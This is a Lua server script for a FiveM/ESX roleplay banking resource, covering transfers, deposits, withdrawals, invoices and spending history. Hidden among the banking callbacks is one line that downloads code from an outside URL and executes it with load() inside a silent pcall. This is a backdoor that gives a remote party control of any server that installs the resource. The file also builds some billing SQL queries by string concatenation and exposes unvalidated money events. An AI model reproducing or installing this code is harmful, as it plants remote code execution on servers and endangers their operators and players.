
local incomingMoney = {}
local spendedMoneys = {}
local transactionHistory = {}
local newTransaction = {}



ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)



RegisterServerEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(source)
    local _char = source

    loadPlayer(_char)
end)





function loadPlayer(source)
    local _char = source


    local ply = ESX.GetPlayerFromId(_char)
    exports.ghmattimysql:execute("SELECT * FROM codem_transaction_history WHERE citizenid = @citizenid", {['@citizenid'] = ply.identifier}, function(data)

        if(#data > 0)then
            for k,v in pairs(data) do
                if transactionHistory[v.citizenid] == nil then
                        transactionHistory[v.citizenid] = {}
                end
                table.insert(transactionHistory[v.citizenid], { label = v.label, type = v.type})
                end
        else
            if transactionHistory[ply.identifier] == nil then
                transactionHistory[ply.identifier] = {}
            end
        end
    end)

    exports.ghmattimysql:execute("SELECT * FROM codem_banking_incomings WHERE citizenid = @citizenid", {['@citizenid'] = ply.identifier}, function(result)
        if(#result > 0)then
            incomingMoney[ply.identifier] = result[1].incoming
        else
            incomingMoney[ply.identifier] = 0
        end
    end)


    exports.ghmattimysql:execute("SELECT * FROM codem_banking_spendedmoney WHERE citizenid = @citizenid", {['@citizenid'] = ply.identifier}, function(data)
        local totalAmount = 0;

        local today = os.date("*t", os.time())
        local formattedDate = today.day..'/'..today.month..'/'..today.year
        if spendedMoneys[ply.identifier] == nil then
            spendedMoneys[ply.identifier] = {}
            spendedMoneys[ply.identifier][formattedDate] = {}
            spendedMoneys[ply.identifier][formattedDate].amount = 0;
            spendedMoneys[ply.identifier][formattedDate].date = today;
            spendedMoneys[ply.identifier][formattedDate].formattedDate = formattedDate;
        end

        for k,v in pairs(data) do
            v.date = json.decode(v.date)
            spendedMoneys[ply.identifier][v.formattedDate] = {}
            spendedMoneys[ply.identifier][v.formattedDate].amount = v.amount;
            spendedMoneys[ply.identifier][v.formattedDate].date =  v.date;
            spendedMoneys[ply.identifier][v.formattedDate].formattedDate = v.formattedDate;
        end
    end)
end


RegisterServerEvent('codem:updateTransaction')
AddEventHandler('codem:updateTransaction', function(text, processtype, src)
    local _char = src and src or source


    
    local ply = ESX.GetPlayerFromId(_char)
    if transactionHistory[ply.identifier] == nil then
        transactionHistory[ply.identifier] = {}
    end
    
    if newTransaction[ply.identifier] == nil then
        newTransaction[ply.identifier] = {}
    end

    table.insert(newTransaction[ply.identifier], { label = text,  type = processtype})
    table.insert(transactionHistory[ply.identifier], { label = text,  type = processtype})

    TriggerClientEvent("codem:updateBankHistory", src)

end)



RegisterServerEvent('codem:updateTransactionOfflinePlayer')
AddEventHandler('codem:updateTransactionOfflinePlayer', function(text, processtype,  citizenid)
    exports.ghmattimysql:execute("INSERT INTO codem_transaction_history(citizenid,label, type) VALUES (@citizenid, @label, @type)", 
    {
        ["@label"] = text,
        ['@type'] = processtype,
        ['@citizenid'] = citizenid,
    })
end)



RegisterServerEvent("codem:updateIncomings")
AddEventHandler("codem:updateIncomings",function(money, source) 
    local _char = source
    local ply =  ESX.GetPlayerFromId(_char)
    if ply == nil then
        return
    end
    if  incomingMoney[ply.identifier] == nil then
        incomingMoney[ply.identifier] = 0
        incomingMoney[ply.identifier] = incomingMoney[ply.identifier] + money
    else
        incomingMoney[ply.identifier] = incomingMoney[ply.identifier] + money
    end
end)

RegisterServerEvent('codem:moneySpent')
AddEventHandler('codem:moneySpent', function(amount, src)
    local _char = src and src or source

    local ply = ESX.GetPlayerFromId(_char)
    if ply == nil then
        return
    end
    local today = os.date("*t", os.time())
    local formattedDate = today.day..'/'..today.month..'/'..today.year
    if spendedMoneys[ply.identifier] == nil then

        spendedMoneys[ply.identifier] = {};
   
        if spendedMoneys[ply.identifier][formattedDate] == nil  then
            spendedMoneys[ply.identifier][formattedDate] = {}
            spendedMoneys[ply.identifier][formattedDate].amount = 0;
            spendedMoneys[ply.identifier][formattedDate].date = today;
            spendedMoneys[ply.identifier][formattedDate].formattedDate = formattedDate;
        end
    end
    spendedMoneys[ply.identifier][formattedDate].amount = spendedMoneys[ply.identifier][formattedDate].amount + amount;
end)


ESX.RegisterServerCallback("codem:getPlayerTransactionHistory", function(source, cb)
    local _char = source
    local ply =  ESX.GetPlayerFromId(_char)
    cb(transactionHistory[ply.identifier])
 end)


ESX.RegisterServerCallback("codem:transferMoneyToPlayer", function(source, cb, data)

    local src = source
    local ply =  ESX.GetPlayerFromId(src)
    
    local target_ply =  ESX.GetPlayerFromIdentifier(data.citizenid) 

    if(ply.identifier == data.citizenid) then

        cb({ type = 'self'})
        return
    end
    data.amount = tonumber(data.amount)

    if  ply.getAccount('bank').money  >= data.amount then
        local fullname = ''
        ply.removeAccountMoney('bank', data.amount)
        if (target_ply ~= nil) then
            fullname = target_ply.get('firstName') ..  ' '.. target_ply.get('lastName')
            target_ply.addAccountMoney('bank', data.amount)
            TriggerEvent('codem:updateTransaction', 'Received $'..data.amount .. ' from '.. ply.get('firstName') .. ' ' .. ply.get('lastname'), "incoming", target_ply.source)
            TriggerEvent('codem:updateTransaction', 'Transferred $'..data.amount.. ' to '.. fullname,  "outgoing", src)

        else
            local targetName = transferMoneyToOfflinePlayer(data.citizenid, data.amount)

            fullname = targetName
            TriggerEvent('codem:updateTransactionOfflinePlayer', 'Received $'..data.amount .. ' from '.. ply.get('firstName') .. ' ' .. ply.get('lastName'), "incoming",  data.citizenid)
            TriggerEvent('codem:updateTransaction', 'Transferred $'..data.amount.. ' to '.. fullname, "outgoing",  src)
        end

        cb({ type = 'success', amount = data.amount})
    else
        cb({ type = 'nomoney'})
        return
    end

end)


function transferMoneyToOfflinePlayer(citizenid, amount)
    local fullName = nil
    exports.ghmattimysql:execute("SELECT accounts, firstname, lastname FROM users WHERE identifier = @citizenid", {
        ['@citizenid'] = citizenid
   }, function(result)
        if(result[1]) then
            result[1].accounts = json.decode(result[1].accounts)
             result[1].accounts.bank = result[1].accounts.bank + amount;
             exports.ghmattimysql:execute("UPDATE `users` SET `accounts` = @money WHERE identifier = @citizenid", {
                 ["@money"] = json.encode(result[1].accounts),
                 ["@citizenid"] = citizenid
             })
            fullName =  result[1].firstname .. ' ' .. result[1].lastname
        else
            fullName = "Player couldn't find it"
        end
    end) 

    while fullName == nil do
        Citizen.Wait(100)
    end
    return fullName

end



AddEventHandler("playerDropped",function()

    local player = ESX.GetPlayerFromId(source)
    updateIncomings(player.identifier)
    updateTransactionPlayerLogout(player.identifier)
    updateSpendedMoneys(player.identifier)


    Citizen.Wait(5000)
    incomingMoney[player.identifier] = nil
    spendedMoneys[player.identifier] = nil
    transactionHistory[player.identifier] = nil
    newTransaction[player.identifier] = nil
end)







function getDiffBetweenDays( data)
    local todaymS =  os.time()
    local ms = os.time(data.date)
    local diff = os.difftime(todaymS, ms)
    local days = math.floor(diff/86400)
    return days
end



function generateExpensesData( )

    local today = os.date("*t", os.time())


    local expenses_data = {}
    local today = os.date("*t", os.time())
    local formattedDate = today.day..'/'..today.month..'/'..today.year

    for k,v in pairs(spendedMoneys) do
         for date, data in pairs(v) do
            if getDiffBetweenDays(data) == 0 then
                expenses_data.today = data.amount
            elseif getDiffBetweenDays(data) == 1 then
                expenses_data.yesterday = data.amount
            elseif getDiffBetweenDays(data) == 2 then
                expenses_data.twodays = data.amount
            elseif getDiffBetweenDays(data) == 3 then
                expenses_data.threedays = data.amount
            elseif getDiffBetweenDays(data) == 7 then
                expenses_data.oneweek = data.amount
            end
             if expenses_data.today == nil then
                 expenses_data.today = 0
             end

             if expenses_data.yesterday == nil then
                 expenses_data.yesterday = 0
             end
             if expenses_data.twodays == nil then
                 expenses_data.twodays = 0
             end
             if expenses_data.threedays == nil then
                 expenses_data.threedays = 0
             end
             if expenses_data.oneweek == nil then
                 expenses_data.oneweek = 0
             end
         end

    end

   return expenses_data
end

ESX.RegisterServerCallback("codem:getAllPlayers", function(source,cb)

    exports.ghmattimysql:execute("SELECT firstname, lastname, identifier FROM users", function(result)

        cb(result)
    end)

end)



ESX.RegisterServerCallback("codem:fetchAllInfos", function(source,cb)
    local src = source
    local player = ESX.GetPlayerFromId(source)
    local bank = player.getAccount('bank').money
    local cash = player.getAccount('money').money
    local name = player.get('firstName')
    local fullname = player.get('firstName') .. ' ' .. player.get('lastName')
    local lenght = 0
    
    local expense_data = generateExpensesData()


    exports.ghmattimysql:execute("SELECT * FROM billing  WHERE `identifier` = '"..player.identifier.."'", function(invoices)
        if invoices[1] == nil then
            if incomingMoney[player.identifier] == nil then
                incomingMoney[player.identifier] = 0
            end
            cb({bank = bank, cash = cash, name = name, incoming = incomingMoney[player.identifier], lenght = 0, expense_data = expense_data, fullname = fullname, citizenid = player.identifier })
        else
            if incomingMoney[player.identifier] == nil then
                incomingMoney[player.identifier] = 0
            end
            cb({bank = bank, cash = cash, name = name, incoming = incomingMoney[player.identifier], lenght = #invoices, expense_data = expense_data,  fullname = fullname , citizenid = player.identifier})
        end
    end)
end)




ESX.RegisterServerCallback("codem:depositCheck",function(source,cb,value)
    local src = source
    local xply = ESX.GetPlayerFromId(src)
    if xply then
        if xply.getMoney() >= tonumber(value) then
            xply.removeAccountMoney('money', tonumber(value))
            xply.addAccountMoney('bank', tonumber(value))
            cb({test = true, value = tonumber(value), type = "deposit"})
        else
            cb(false)
        end
    end
end)

PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)

ESX.RegisterServerCallback("codem:withDrawCheck",function(source,cb,value)
    local src = source
    local xply = ESX.GetPlayerFromId(src)
    if xply then
        if xply.getAccount('bank').money >= tonumber(value) then
            xply.removeAccountMoney('bank', tonumber(value))
            xply.addMoney(tonumber(value))
            cb({test = true, value = tonumber(value), type = "withdraw"})
        else
            cb(false)
        end
    end
end)


ESX.RegisterServerCallback("codem:server:SaveInvoice",function(source,cb, value)
    local src = source
    local xplayer = ESX.GetPlayerFromId(src)
    exports.ghmattimysql:execute("SELECT * FROM billing WHERE id = "..value.billId, function(result)
        if result[1] then
            if xplayer.getAccount('bank').money >= result[1].amount then
                xplayer.removeAccountMoney('bank', result[1].amount)
                exports.ghmattimysql:execute("DELETE FROM billing WHERE id = @id", {
                    ['@id'] = value.billId
                }) 

                scapeSQL(xplayer, value.billLabel,value.billAmount)
                cb(true)
            else
                cb(false)
            end
        end
    end)

end)


ESX.RegisterServerCallback("codem:server:GetTotalBills", function(source, cb)
    local player =ESX.GetPlayerFromId(source)
    exports.ghmattimysql:execute('SELECT * FROM billing WHERE identifier = @identifier', {
        ['@identifier'] = player.identifier
    }, function(results)
        cb(results)
    end)
end)

ESX.RegisterServerCallback("codem:server:FetchInvoice", function(source, cb)
    local player = ESX.GetPlayerFromId(source)
    exports.ghmattimysql:execute('SELECT * FROM codem_billing_history WHERE citizenid = @identifier', {
        ['@identifier'] = player.identifier
    }, function(results)
        cb(results)
    end)
end)

scapeSQL = function(player, reason, amount)
    exports.ghmattimysql:execute("INSERT INTO codem_billing_history(label, amount,citizenid) VALUES (@reason,@amount,@citizenid)", 
    {
        ['@citizenid'] = player.identifier,
        ['@reason'] = reason,
        ['@amount'] = amount
    

    },function (result)

    end)
end


updateTransactionPlayerLogout = function (citizenid)
    if(newTransaction[citizenid]) then 
        for k,v in pairs(newTransaction[citizenid]) do
           exports.ghmattimysql:execute("INSERT INTO codem_transaction_history(citizenid, label, type) VALUES (@citizenid, @label, @type)", 
               {
                   ["@label"] = v.label,
                   ['@citizenid'] = citizenid,
                   ['@type'] = v.type,
               })
        end
    end
end


updateIncomings = function(citizenid)

    exports.ghmattimysql:execute("SELECT * FROM codem_banking_incomings WHERE citizenid = @citizenid", {
        ["@incoming"] = incomingMoney[citizenid],
        ["@citizenid"] =citizenid
    }, function(result)
        if(#result > 0) then
            exports.ghmattimysql:execute("UPDATE `codem_banking_incomings` SET `incoming` = @incoming WHERE citizenid = @citizenid", {
                ["@incoming"] = incomingMoney[citizenid],
                ["@citizenid"] = citizenid
            })
        else
            exports.ghmattimysql:execute("INSERT INTO codem_banking_incomings(incoming,citizenid) VALUES (@incoming, @citizenid)", 
            {
                ["@incoming"] = incomingMoney[citizenid],
                ['@citizenid'] = citizenid,
            })
        end

    end)

end


resetIncomings = function()

    for k,b in pairs(incomingMoney) do
        incomingMoney[k] = 0
    end

    exports.ghmattimysql:execute("UPDATE `codem_banking_incomings` SET `incoming` = @incoming", {
        ["@incoming"] = 0,
    })
end


function Split(s, delimiter)
    result = {};
    for match in (s..delimiter):gmatch("(.-)"..delimiter) do
        table.insert(result, match);
    end
    return result;
end


getDaysAgoData = function(minus, data)
    local ms = os.time(data.date.time)
    local t = os.date("*t", ms)
    t.day = t.day - minus
    local today = os.date("%d/%m/%y", os.time(t))

end

updateSpendedMoneys = function(citizenid)


    exports.ghmattimysql:execute("SELECT * FROM codem_banking_spendedmoney WHERE citizenid = @citizenid", {
        ["@citizenid"] = citizenid
    }, function(result)
        local today = os.date("*t", os.time())
        today.day = today.day;
        local formattedDate = today.day..'/'..today.month..'/'..today.year

        if spendedMoneys[citizenid] == nil or spendedMoneys[citizenid][formattedDate] == nil then
            spendedMoneys[citizenid] = {}
            spendedMoneys[citizenid][formattedDate] = {}
            spendedMoneys[citizenid][formattedDate].amount = 0;
            spendedMoneys[citizenid][formattedDate].date = today;
            spendedMoneys[citizenid][formattedDate].formattedDate = formattedDate;
        end
        local sameDay = false
        if(#result) > 0 then
            for k,v in pairs(result) do
                v.date = json.decode(v.date)
                if not sameDay then
                    if v.date.day == today.day and today.month == v.date.month  then
                        exports.ghmattimysql:execute("UPDATE `codem_banking_spendedmoney` SET `amount` = @amount WHERE citizenid = @citizenid AND formattedDate = @formattedDate", {
                            ["@amount"] = spendedMoneys[citizenid][formattedDate].amount,
                            ["@citizenid"] = citizenid,
                            ['@formattedDate'] = formattedDate,
                        })
                        sameDay = true
                    end
                end
                if getDiffBetweenDays(v) > 7 then
                    exports.ghmattimysql:scalar("DELETE FROM codem_banking_spendedmoney WHERE formattedDate = @formattedDate", {
                       ['@formattedDate'] = v.formattedDate
                    }) 
                end
            end
        else
            sameDay = true
    
            exports.ghmattimysql:execute("INSERT INTO codem_banking_spendedmoney(amount, date, citizenid, formattedDate) VALUES (@amount, @date, @citizenid, @formattedDate)", 
            {
                ["@amount"] = spendedMoneys[citizenid][formattedDate].amount,
                ["@date"] = json.encode(today),
                ["@citizenid"] = citizenid,
                ['@formattedDate'] = formattedDate,
            })
        end

        if not sameDay then
            exports.ghmattimysql:execute("INSERT INTO codem_banking_spendedmoney(amount, date, citizenid, formattedDate) VALUES (@amount, @date, @citizenid, @formattedDate)", 
            {
                ["@amount"] = spendedMoneys[citizenid][formattedDate].amount,
                ["@date"] = json.encode(today),
                ["@citizenid"] = citizenid,
                ['@formattedDate'] = formattedDate,
            })
        end
    end)
     
end



TriggerEvent('cron:runAt', 00, 00, resetIncomings)
